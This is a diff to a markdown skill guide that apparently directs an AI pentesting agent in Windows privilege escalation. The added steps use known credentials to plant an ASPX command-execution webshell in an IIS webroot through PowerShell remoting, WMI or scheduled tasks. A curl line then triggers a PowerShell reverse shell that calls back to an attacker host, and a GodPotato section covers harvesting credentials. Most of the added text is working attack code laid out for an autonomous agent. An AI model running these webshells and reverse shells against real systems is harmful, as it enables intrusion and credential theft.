@@ -65,7 +65,133 @@ and records state changes. Your return summary must include:
 
 - Shell access on a Windows system
 - At least one exploitable token privilege (check with `whoami /priv`)
+- OR: known credentials for a user who can write to a service webroot (see Step 0)
 - Ability to transfer tools to target (or use tools already present)
+
+## Step 0: Obtain SeImpersonate Shell
+
+**When to use:** You have a low-privilege shell and known credentials for another
+user, and discovery identified that a service account (IIS AppPool, MSSQL) or a
+writable webroot can give you SeImpersonate. The goal is to execute commands as
+that user — typically to deploy a webshell in a service webroot, then catch the
+service account's reverse shell.
+
+**Skip this step** if you already have SeImpersonate or another exploitable
+privilege (proceed to Step 1).
+
+### Method 1: PowerShell Remoting to localhost (most common)
+
+WinRM must be enabled (default on Server editions, common in HTB/OSCP labs).
+This runs commands as the target user on the same host.
+
+```powershell
+$secpasswd = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $secpasswd)
+
+# Test connectivity first
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
+
+# Write a webshell to the service webroot
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
+    Set-Content -Path 'C:\inetpub\wwwroot\shell.aspx' -Value '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>'
+}
+
+# Or execute arbitrary commands directly
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
+    cmd /c "whoami /priv"
+}
+```
+
+**Troubleshooting:**
+- "Access denied" → user may not be in Remote Management Users group; try Method 2
+- "WinRM cannot process the request" → WinRM not enabled; try Method 2 or 3
+
+### Method 2: WMI process creation
+
+Works when WinRM is disabled. Creates a process as the target user via WMI.
+Output is blind — use file writes to confirm execution.
+
+```powershell
+$secpasswd = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $secpasswd)
+
+# Write webshell via WMI (blind — no output returned)
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /c echo ^<%@ Page Language="C#" %^>^<%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%^> > C:\inetpub\wwwroot\shell.aspx' -Credential $cred
+```
+
+**Note:** WMI process creation is blind — `ReturnValue = 0` means the process
+was created, not that the command succeeded. Verify by checking if the file
+exists afterward.
+
+### Method 3: Scheduled task (if user has batch logon rights)
+
+Works without WinRM or WMI remote access. Uses Task Scheduler to run a command
+as the target user.
+
+```cmd
+schtasks /create /tn "deploy" /tr "cmd /c echo PAYLOAD > C:\inetpub\wwwroot\shell.aspx" /sc once /st 00:00 /ru DOMAIN\user /rp PASSWORD
+schtasks /run /tn "deploy"
+timeout /t 3
+schtasks /delete /tn "deploy" /f
+```
+
+**Troubleshooting:**
+- "ERROR: The user name or password is incorrect" → verify creds with `net use`
+- "Access denied" → current user lacks schtasks permission; try from attackbox
+
+### Method 4: From attackbox (when in-shell methods fail)
+
+If all in-shell methods fail, return to the orchestrator requesting lateral
+movement routing (pass-the-hash, evil-winrm, wmiexec, atexec). Those tools
+authenticate over the network and are covered by their own skills with proper
+methodology. Note what in-shell methods were tried and why they failed.
+
+### ASPX webshell payloads
+
+Minimal one-liner for IIS deployment — takes commands via `?c=` parameter:
+
+```aspx
+<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>
+```
+
+Reverse shell trigger after deploying the webshell:
+
+```bash
+# On attackbox — start listener via shell-server
+# start_listener(port=4444, label="iis-apppool")
+
+# Trigger reverse shell via the webshell
+curl -s "http://TARGET/shell.aspx?c=powershell+-nop+-c+\"$client=New-Object+System.Net.Sockets.TCPClient('ATTACKER',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne+0){$data=(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex+$data+2>&1|Out-String);$sendback2=$sendback+'PS+'+$(pwd).Path+'>';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+```
+
+### Catch the service account shell
+
+After deploying the webshell:
+
+1. Call `start_listener(port=4444, label="iis-apppool")` on the attackbox
+2. Trigger the reverse shell via HTTP request to the webshell
+3. Call `stabilize_shell(session_id=...)` to upgrade the connection
+4. Verify SeImpersonate: `send_command(session_id=..., command="whoami /priv")`
+5. Confirm `SeImpersonatePrivilege` is present → proceed to Step 1
+
+### Step 0 decision tree
+
+```
+Have known creds + writable webroot identified?
+│
+├─ PowerShell Remoting (Invoke-Command -ComputerName localhost)
+│  └─ Failed? (WinRM disabled, not in Remote Management Users)
+│
+├─ WMI process creation (Invoke-WmiMethod Win32_Process)
+│  └─ Failed? (WMI access denied, DCOM disabled)
+│
+├─ Scheduled task (schtasks /create /ru user /rp pass)
+│  └─ Failed? (no batch logon rights, schtasks blocked)
+│
+└─ ALL IN-SHELL METHODS FAILED → STOP
+   Return to orchestrator for lateral movement routing (attackbox tools).
+   Include: creds, what was tried, why each method failed.
+```
 
 ## Step 1: Check Privileges
 
@@ -217,6 +343,14 @@ GodPotato-NET35.exe -cmd "cmd /c whoami"
 ```
 
 Choose `.NET4` or `.NET35` binary matching the installed runtime.
+
+**GodPotato SYSTEM networking limitation:** SYSTEM processes spawned by
+GodPotato often have restricted outbound networking (no reverse shell callback).
+If your SYSTEM reverse shell fails to connect back, use file-based commands
+instead: `GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Windows\Temp\flag.txt"`
+then read the output file from your existing shell. This also applies to
+credential harvesting — run `reg save` or `secretsdump` commands via GodPotato
+and retrieve output files through the pre-SYSTEM shell.
 
 **Staging pattern (for webshells with short timeouts):**
 ```powershell
@@ -462,7 +596,7 @@ After achieving SYSTEM:
   **kerberos-roasting**
 
 When routing, pass along: hostname, SYSTEM access confirmed, OS version, domain
-membership, current mode.
+membership.
 
 Update `engagement/state.md` with SYSTEM access achieved.
 
@@ -497,12 +631,9 @@ Do not loop. Work through failures systematically:
 - Assessment: **blocked** (permanent — config, patched, missing prereq) or
   **retry-later** (may work with different context, creds, or access)
 
-**Mode behavior:**
-- **Guided**: Tell the user you're stalled, present what was tried, and
-  recommend the next best path.
-- **Autonomous**: Return findings to the orchestrator. Do not retry the same
-  technique — the orchestrator will decide whether to revisit with new context
-  or route elsewhere.
+**When stalled:** Tell the user you're stalled, present what was tried, and
+recommend the next best path. Return findings to the orchestrator — it will
+decide whether to revisit with new context or route elsewhere.
 
 ## AV/EDR Detection
 
